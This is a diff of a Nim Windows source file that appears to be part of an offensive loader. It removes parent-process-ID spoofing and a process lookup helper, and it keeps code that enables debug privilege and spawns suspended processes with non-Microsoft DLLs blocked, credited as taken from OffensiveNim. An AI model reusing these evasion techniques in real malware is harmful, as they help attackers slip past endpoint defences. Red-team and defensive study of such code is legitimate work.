@@ -2,28 +2,6 @@ import winim
 import nimprotect
 
 
-
-proc toString*(chars: openArray[WCHAR]): string =
-    result = ""
-    for c in chars:
-        if cast[char](c) == '\0':
-            break
-        result.add(cast[char](c))
-
-
-proc getPid*(pname: string): DWORD =
-    var entry: PROCESSENTRY32
-    var hSnapshot: HANDLE
-    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
-    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
-    defer: CloseHandle(hSnapshot)
-    if Process32First(hSnapshot, addr entry):
-        while Process32Next(hSnapshot, addr entry):
-            if entry.szExeFile.toString == pname:
-                return entry.th32ProcessID
-    return 0
-
-
 proc setDebugPrivilege*(): bool =
     # Inits
     var tp : TOKEN_PRIVILEGES
@@ -47,7 +25,7 @@ proc setDebugPrivilege*(): bool =
 
 
 # Heavily stolen from https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/blockdlls_acg_ppid_spoof_bin.nim
-proc createSuspendedExtendedProcess*(processCmd: cstring, parentProcessName: string, isBlockDlls: bool): PPROCESS_INFORMATION =
+proc createSuspendedExtendedProcess*(processCmd: cstring, isBlockDlls: bool): PPROCESS_INFORMATION =
 
     # Some varaibles
     const PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x00000001 shl 44
@@ -77,25 +55,6 @@ proc createSuspendedExtendedProcess*(processCmd: cstring, parentProcessName: str
             cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
             addr policy,
             sizeof(policy),
-            NULL,
-            NULL
-        ) != TRUE:
-            when not defined(release): echo "[-] Could not update process attribute to block Dlls"
-            quit()
-
-    # If parentProcessName supplied - get handle to spoofed PPID and update attribute
-    if parentProcessName != "":
-        var parentProcessId = getPid(parentProcessName)
-        var parentProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parentProcessId)
-        if parentProcessHandle == 0:
-            when not defined(release): echo "[-] Could not get handle to spoofed parent process. using current process as parent"
-            parentProcessHandle = GetCurrentProcess()
-        if UpdateProcThreadAttribute(
-            si.lpAttributeList,
-            0,
-            cast[DWORD_PTR](PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
-            addr parentProcessHandle,
-            sizeof(parentProcessHandle),
             NULL,
             NULL
         ) != TRUE:
